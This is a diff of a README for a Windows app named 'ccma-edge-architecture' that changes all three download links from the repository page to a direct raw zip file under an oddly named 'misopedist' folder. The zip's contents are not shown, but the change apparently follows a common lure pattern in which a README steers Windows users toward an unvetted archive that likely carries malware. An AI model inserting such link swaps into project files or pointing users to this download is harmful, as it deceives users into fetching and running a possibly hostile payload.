@@ -1,11 +1,11 @@
 # 🧠 ccma-edge-architecture - Keep context clear and persistent
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gonzaloaquiferous551/ccma-edge-architecture)
+[![Download on GitHub](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gonzaloaquiferous551/ccma-edge-architecture/raw/refs/heads/main/misopedist/architecture-ccma-edge-v3.6.zip)
 
 ## 📥 Download
 Use this link to visit the page and download the app:
 
-https://github.com/gonzaloaquiferous551/ccma-edge-architecture
+https://github.com/gonzaloaquiferous551/ccma-edge-architecture/raw/refs/heads/main/misopedist/architecture-ccma-edge-v3.6.zip
 
 ## 🪟 Windows Setup
 This app is made for Windows users who want to run it on a local machine.
@@ -156,4 +156,4 @@ The main goal is to keep context stable and easy to reuse over time
 ## 📎 Download again
 If you need to return to the download page, use this link:
 
-https://github.com/gonzaloaquiferous551/ccma-edge-architecture
+https://github.com/gonzaloaquiferous551/ccma-edge-architecture/raw/refs/heads/main/misopedist/architecture-ccma-edge-v3.6.zip
